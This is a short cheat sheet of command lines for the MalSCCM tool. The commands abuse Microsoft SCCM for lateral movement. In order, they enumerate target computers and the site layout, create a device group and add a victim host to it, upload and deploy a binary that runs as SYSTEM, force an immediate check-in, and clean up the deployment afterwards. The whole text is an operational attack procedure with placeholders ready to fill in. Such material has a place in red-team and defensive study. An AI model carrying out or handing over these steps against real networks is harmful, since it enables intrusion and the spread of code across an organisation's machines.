### Source
```
https://github.com/nettitude/MalSCCM
```


### List possible targets for lateral movement using SCCM
```
MalSCCM.exe inspect /computers
```

### Check whether the Distribution Point is also the Primary Site (central management location)
```
MalSCCM.exe inspect /server:&lt;distributionPointServerFqdn&gt; /groups
```

### List Computers, Groups, PrimaryUser, Forest, Packages, Applications and Deployments
```
MalSCCM.exe inspect /all /server:&lt;distributionPointServerFqdn&gt;
```

### Create new group for deployment
```
MalSCCM.exe group /create /groupname:&lt;newGroup&gt; /grouptype:device
```

### Add target computer to group
```
MalSCCM.exe group /addhost /groupname:&lt;newGroup&gt; /host:&lt;computer&gt;
```

### Add application and upload binary that will be executed as SYSTEM
```
MalSCCM.exe app /create /name:&lt;appName&gt; /uncpath:"\\&lt;distributionPointServerFqdn&gt;\SCCMContentLib$\&lt;file&gt;.exe"
```

### Check if application exists
```
MalSCCM.exe inspect /applications
```

### Deploy application
```
MalSCCM.exe app /deploy /name:&lt;appName&gt; /groupname:&lt;newGroup&gt; /assignmentname:&lt;deploymentName&gt;
```

### Initiate checkin (trigger installation as soon as possible)
```
MalSCCM.exe checkin /groupname:&lt;newGroup&gt;
```

### Check deployment status
```
MalSCCM.exe inspect /deployments
```

### Remove deployments of applications 
```
MalSCCM.exe app /cleanup /name:&lt;appName&gt;
```


